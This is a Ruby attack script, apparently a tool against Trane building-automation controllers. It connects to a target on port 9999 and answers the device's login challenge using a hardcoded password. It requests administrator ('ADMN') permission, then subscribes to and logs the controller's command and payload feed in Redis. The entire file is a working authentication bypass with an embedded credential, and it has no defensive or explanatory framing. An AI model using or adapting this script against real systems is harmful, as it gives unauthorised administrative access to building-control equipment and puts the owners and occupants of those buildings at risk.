#!/usr/bin/env ruby

require 'digest'
require 'socket'
require 'optparse'
require 'command_line_reporter'
require 'redis'
require 'json'

class Breaker

  options = {}

  ARGV.each do |arg|
    puts arg
  end

  command = OptionParser.new do |opt|
    opt.banner = "Usage: tranewreck.rb COMMAND [OPTIONS]"
    opt.separator  ""
    opt.separator  "Commands"
    opt.separator  "     target: Subscribe to EV feed."
    opt.separator  ""
    opt.separator  "Options"
    opt.on("-t","--target IP","where?") do |name|
      options[:target] = name
    end
    opt.on("-h","--help","help") do
      puts command
    end
  end

  command.parse!
  target = options[:target] || '127.0.0.1'
  hostname = target
  port = 9999
  password = "Cold,,2100"
  permission = "ADMN"
  auth_id = ""
  @redis = Redis.new(:host => "127.0.0.1", :port => 6379)
  @auth_history = @redis.get("auth_history") || "[]"
  @smil_ids = @redis.get("smil_ids") || "[]"
  @command_verbs = @redis.get("command_verbs") || "[]"
  @payloads = @redis.get("payloads") || "[]"
  @history = @redis.get("history") || "[]"
  @auth_history = JSON.parse(@auth_history)
  @smil_ids= JSON.parse( @smil_ids)
  @command_verbs = JSON.parse(@command_verbs)
  @payloads = JSON.parse(@payloads)
  @history = JSON.parse(@history)

  def self.process_data(the_good_stuff)
    if the_good_stuff =~ /(?<smil_id>(\d\.|\d)+)::(?<command_verb>([0-9]|[a-z])+)\((?<payload>.*)\);/i
      if $~[:smil_id]
        @smil_ids << $~[:smil_id]
        @command_verbs << $~[:command_verb]
        @payloads << $~[:payload]
        puts the_good_stuff
        @history << {Time.now.to_s => the_good_stuff.to_s}
        @redis.set("smil_ids", @smil_ids.to_json)
        @redis.set("command_verbs", @command_verbs.to_json)
        @redis.set("payloads", @payloads.to_json)
        @redis.set("history", @history.to_json)
      end
    end
  end

  def self.probe(sock, data)
    puts " - Sending: #{data}"
    sock.puts(data)
    while line = sock.gets  
      data = line
      puts data
    end
    return data
  end

  s = TCPSocket.open(hostname, port)

  while line = s.gets  
    data = line.chop
    process_data(data)
    if data =~ /1::evChallenge\(/
      puts "TRANE challenge detected."
      data =~/1::evChallenge\((?<arg>.*),"(?<challenge>.*)"\);/
      arg = $~[:arg]
      challenge = $~[:challenge]
      puts " - Arg: #{arg}"
      puts " - challenge: #{challenge}"
      evchallenge = challenge.gsub(/([^"]{2})/){|str| str.hex.chr}
      msg = arg.to_i.chr + password+ evchallenge
      puts " - Processed 'evchallenge': #{evchallenge}"
      puts " - Processed 'msg': #{msg}"
      assembled_response = "1::login(#{arg},\"#{Digest::SHA1.hexdigest(msg).upcase}\",\"#{permission}\",\"DefaultLabel\",,,,,);\n"
      puts " - Assembled login command: :#{assembled_response}"
      s.puts(assembled_response)
      if line = s.gets  
        data = line.chop
        data =~ /1::evAuthorized\((?<auth>\d*)\);/
        auth_id = $~[:auth]
        @redis.set("auth_id", auth_id)
        @auth_history << auth_id
        @redis.set("auth_history", @auth_history)
        puts "Received--: "+ data 
        puts " - Auth ID: #{auth_id}"
      end

      sec_probe = "1::subscribe(TRUE);\n"
      data = probe(s, sec_probe)

    elsif data =~ /^((\d\.|\d::)+)/
    end
  end
  s.close               # Close the socket when done
end
